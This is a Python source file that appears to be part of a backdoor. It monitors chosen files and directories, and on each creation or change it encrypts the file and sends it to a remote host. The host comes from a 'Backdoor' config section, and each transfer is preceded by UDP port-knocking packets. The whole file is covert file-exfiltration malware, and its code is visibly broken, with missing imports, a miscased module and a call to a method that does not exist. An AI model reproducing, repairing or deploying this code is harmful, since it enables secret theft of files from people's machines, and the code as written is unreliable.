from watchdog.events import PatternMatchingEventHandler, DirModifiedEvent
from watchdog.observers import Observer
import encryption, helpers
import Configparser

class MyEventHandler(PatternMatchingEventHandler):
    def __init__(self, patterns=None):
        PatternMatchingEventHandler.__init__(self, patterns)
        self.fileTransfer = FileTransfer()

    def on_created(self, event):
        self.fileTransfer.sendFile(event.src_path)

    def on_modified(self, event):
        if type(event) == DirModifiedEvent:
            return

        self.sendFile(event.src_path)

class FileMonitor(object):
    def __init__(self):
        self.watches = []
        self.observer = Observer()
        self.observer.start()

    def addWatch(self, path, filename=None, recursive=False):
        if filename is None:
            self.watches.append(self.observer.schedule(MyEventHandler(), path, recursive))
            return

        if not path.endswith('/'):
            full_path = path + '/' + filename
        else:
            full_path = path + filename
        self.watches.append(self.observer.schedule(MyEventHandler([full_path,]), path, recursive))

    def removeWatch(self, path):
        if not path.endswith('/'):
            path += '/'

        for watch in self.watches:
            if watch.path == path:
                self.observer.unschedule(watch)
                return True
        return False

    def removeAllWatches(self):
        self.observer.unschedule_all()

class FileTransfer(object):
    def __init__(self):
        config = Configparser.Configparser()
        config.read('setup.config')

        self.knockList = config.get('General', 'knockList').split(',')
        self.filePort = config.get('General', 'filePort')
        self.remoteIP = config.get('Backdoor', 'remoteIP')
        self.localIP = config.get('Backdoor', 'localIP')
        self.localPort = config.get('Backdoor', 'localPort')

    def sendFile(self, filename):
        encryptedString = encryption.encryptFile(filename)

        knocker = self.portKnocking()
        time.sleep(2)

        sock = helpers.createSocket()
        sock.connect((self.remoteIP, self.filePort))

        sock.sendall(encryptedString)
        sock.send(b'EOF')

    def portKnocking(self):
        for port in self.knockList:
            pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(sport=self.localPort, dport=int(port))
            send(pkt, verbose=False)
            time.sleep(0.1)
